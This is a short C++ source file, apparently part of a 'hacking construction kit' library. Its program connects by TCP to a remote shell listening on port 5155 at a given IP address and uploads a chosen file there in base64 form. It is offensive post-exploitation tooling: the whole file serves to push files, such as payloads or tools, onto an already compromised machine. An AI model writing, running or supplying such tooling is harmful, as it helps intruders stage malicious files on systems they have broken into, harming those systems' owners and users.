/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include <tchar.h>

#include <upload_file_base64.h>
#include <tcp.h>
#include <tstring.h>
#pragma comment(lib, "hacking construction kit.lib")

int _tmain(int argc, wchar_t* argv[])
{
#if defined (WIN32) && defined (_DEBUG)
	_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF|_CRTDBG_LEAK_CHECK_DF);
#endif
	if (argc != 3){
		printf("upload a file to a remote shell on port 5155\n");
		printf("usage: %s ip filename\n", argv[0]);
		return 1;
	}

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2), &wsaData);

	char *destinationFile = wToc(argv[2]);
	UploadFileInBase64 upload(argv[2], destinationFile);

	char *ip = wToc(argv[1]);
	Tcp tcp(ip, 5155);
	tcp.tcpconnect();
	while (tcp.selectread(5)) {
		Tcp::readResponseFromSocket(tcp.m_socket);
	}
	if (tcp.selectwrite()){
		upload.upload(tcp.m_socket);
	}
	delete[] destinationFile;
	delete[] ip;
	return 0;
}

